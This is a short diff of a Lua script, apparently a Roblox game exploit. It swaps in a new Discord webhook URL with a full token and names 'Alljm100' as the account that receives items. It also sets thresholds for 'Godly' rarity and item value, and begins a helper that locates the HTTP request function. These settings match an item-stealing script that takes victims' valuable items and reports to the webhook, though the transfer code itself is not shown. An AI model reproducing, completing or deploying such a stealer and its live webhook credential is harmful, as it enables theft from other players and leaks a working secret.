@@ -2,11 +2,11 @@ _G.Ex = _G.Ex or false
 if _G.Ex then return end
 _G.Ex = true
 
-local WEBHOOK = "https://discord.com/api/webhooks/1546514326901358742/u0c8GvShbKToQcd8w41FMZ88"
+local WEBHOOK = "https://discord.com/api/webhooks/1546525713094414346/WeNmEG_D7Ct1t_jehpqSwwOGDv-u8Nxww-2w2Uh0vw5dpvekF3AYxlztEERoB4rFcuHM"
 local RECEIVER = {"Alljm100"}
 local MINIMUM_RARITY = "Godly"
 local MINIMUM_VALUE = 10
-local RECEIVERx = "Alljm100"   -- ← FIXED: Added quotes
+local RECEIVERx = RECEIVER
 
 local function GetRequestFunction()
     if request then return request end
